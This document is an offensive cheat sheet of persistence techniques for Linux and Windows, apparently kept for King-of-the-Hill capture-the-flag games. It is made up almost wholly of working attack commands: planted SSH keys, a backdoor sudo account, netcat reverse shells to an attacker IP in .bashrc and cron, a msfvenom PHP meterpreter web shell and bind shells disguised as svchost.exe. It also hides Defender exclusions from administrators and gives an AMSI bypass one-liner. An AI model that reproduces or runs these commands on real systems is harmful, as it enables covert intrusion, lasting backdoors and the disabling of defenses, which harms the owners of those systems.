# Persistance Shortcuts
## Linux Persisttance

--> SSH
#This technique requires Public Key Authentication to be enabled in the SSH configuration file
ssh-keygen
## pubkey [paste in remote /home/user/.ssh/authorized_keys.]
## passphrase --> cyber

chmod 700 /home/user/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVAVvQFVGiNGuhlfXeLgA9+rwkzG3YOMAz5efIlM97edEOobq6qLHZJN3V5MrAy4GXZ01slEKMgRoBwyv9WYB67KMDt/a4L2G5YLUwQQsP1Ht8kVimTxuZ00oq52M+22V1a9wcY2XV9Soj1g0FAzSwloH4xy5tf0GcT68PZ3c4mpAnrGFTk3HoTHZaNqidQDI1EnVRRLrwPX3m1FtKf90vKSo9zzKd3r52uk2tEvr6WOTEHzEV+JEgKoFIME/FlH2Qt95LXEpTDYjfjEcEkPEx37J+buyNW46+IbSLgKWqJ3SeIuYaoc1h5VpGre4fqD4Wg85gOSfvt6g+5/MfuKCAwvIM6k/Ux1np3/ZHWc4Opv8eyVSk2/4QliHBN6diK1laeRPOqd0vcBfCR2tRXIgQGcoGtqycli9jWmNGIZcn8RufLcJOP2zAK6wDlSpqG2VdgK1po48g9JgsbK5VpG3qBbRM2As2tYyGFcCef/q7S14T95iP3bf0F+0gkBbsMsM= cyberxploit@parrot" >> authorized_keys

chown -R user:user /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys

# locally will now ssh in
ssh -i /home/cyberxploit/.ssh/id_rsa user@target



--> Local Priviledged User
useradd -m -s /bin/bash nginxx
usermod -aG sudo nginxx
passwd nginxx


--> Unix Shell Config Mod
echo "nc -e /bin/bash 10.9.2.16 9991 2>/dev/null &" >> ~/.bashrc
vi ~/.bashrc
nc -e /bin/bash 10.9.2.16 9991 2>/dev/null &


--> WebShell
## Locally
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.9.2.16 LPORT=4444 -e php/base64 -f raw > backup.php
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 10.9.2.16
set LPORT 4444
run

python3 -m http.server 8080

## Remote
cd /var/www/html/
wget http://10.9.2.16:8080/backup.sh

## Browser
http://targetsIP/backup.php


--> Cron Jobs
## NetCat
* * * * * nc 10.9.2.16 9991 -e /bin/sh
## PHP
* * * * * php -f /var/www/html/backup.php


## Bind Shell Persistence on Windows
The bind shell is just a .exe that listens on a port. Persistence = making sure it auto-starts after reboot or if a defender kills the process.

| Method | Command (on target) | Survives reboot? |
|---|---|---|
| **Registry Run key** | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateSvc /t REG_SZ /d "C:\ProgramData\bind.exe" /f` | ✅ |
| **Startup folder** | `copy bind.exe "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"` | ✅ |
| **Scheduled Task** | `schtasks /create /tn "SysHealthCheck" /tr "C:\ProgramData\bind.exe" /sc onstart /ru SYSTEM` | ✅ |
| **Windows Service** | `sc create BindSvc binPath= "C:\ProgramData\bind.exe" start= auto` + `sc start BindSvc` | ✅ |
| **WMI Event Sub** | `wmic /namespace:\\root\subscription /node:target call create __EventFilter ...` | ✅ (stealthiest) |


## Recommended KoTH Setup

```sh
# 1. Generate the bind shell (from previous conversation)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe \
  -e x86/shikata_ga_nai -i 5 \
  -x /usr/share/windows-binaries/plink.exe \
  -o bind.exe

# 2. Upload to target (via your existing access)
# Place in a "legit-looking" location:
# C:\ProgramData\svchost.exe   (looks like a system file)

# 3. Persist via service (most reliable):
sc create "WindowsUpdateService" binPath= "C:\ProgramData\svchost.exe" start= auto
sc start "WindowsUpdateService"

# 4. Lock the file:
# (from your Linux box, if you have SMB/other access)
# Or via PowerShell on target:
powershell -c "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WindowsUpdateService' -Name Start -Value 2"   
```

## Why Bind Shell Persistence Is Easier Than Reverse


| Concern | Reverse Shell | Bind Shell |
|---|---|---|
| **LHOST dependency** | If your IP changes, all reverse shells break | **No LHOST** — it just listens. You connect whenever you want. |
| **NAT/firewall** | Target must reach you | You must reach target (easier on KoTH LAN) |
| **Defender detection** | Outbound connection to external IP = obvious | Inbound listener on a random port = looks like a service |
| **Reconnect** | Target must re-execute to dial out | Just `nc target 4444` again — it's already listening |


## Bypassing Windows Defender for Custom Services
1. Add Exclusions (Most Effective)
The MDAV exclusion key (HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions) is kernel-locked — even SYSTEM can't write it directly.  Use the GPO path instead:

```sh
# Exclude your service path
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\svchost.exe" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\svchost.exe" -Value 0 -PropertyType DWord -Force

# Or exclude by extension (nuclear option)
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" -Name ".exe" -Value 0 -PropertyType DWord -Force

# Or exclude by process name
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" -Name "svchost.exe" -Value 0 -PropertyType DWord -Force

# Apply
gpupdate /force   
```

Then hide the exclusions from defenders:

```sh
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -PropertyType DWord -Force   
```
Now 
```sh
Get-MpPreference | Select ExclusionPath
```
 returns empty — even as SYSTEM. They'd have to read the raw registry to find it.


2. Make the Service Look Legitimate

| Trick | Example |
|---|---|
| **Name it like a system service** | `sc create "WMI Provider Host" ...` instead of `sc create "BindSvc" ...` |
| **Place in a system path** | `C:\Windows\System32\Tasks\` or `C:\ProgramData\` |
| **Name the exe innocuously** | `svchost.exe`, `msiexec.exe`, `spoolsv.exe` |
| **Use a legit template** | Your `plink.exe` template already helps — `file` check shows PuTTY |
| **Set a valid description** | `sc description "WMI Provider Host" "Windows Management Instrumentation service"` |


3. Disable Real-Time Monitoring (Nuclear)
```sh
Set-MpPreference -DisableRealtimeMonitoring $true   
```
This is loud — a defender checking Get-MpComputerStatus will see it. Use only as a last resort or combined with the exclusion approach.

4. AMSI Bypass (For PowerShell Delivery)
If you're delivering the service creation via PowerShell and Defender blocks the script:

```sh
# Patch AMSI in memory (one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)   
```

Or use AMSITrigger to find which strings trigger detection, then obfuscate those specific strings (base64, concat, reverse). 

```sh
# 1. Hide from Defender
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\WmiPrvSE.exe" -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -PropertyType DWord -Force

# 2. Create service with legit-looking name
sc create "WMI Provider Host" binPath= "C:\ProgramData\WmiPrvSE.exe" start= auto
sc description "WMI Provider Host" "Windows Management Instrumentation service"
sc start "WMI Provider Host"

# 3. Lock the binary
icacls "C:\ProgramData\WmiPrvSE.exe" /deny "Users:(W)"
icacls "C:\ProgramData\WmiPrvSE.exe" /deny "Users:(D)"

# 4. Persist the exclusion (in case defender reboots)
# Add to your existing scheduled task or cron:
# * * * * * reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\WmiPrvSE.exe" /t REG_DWORD /d 0 /f   
```
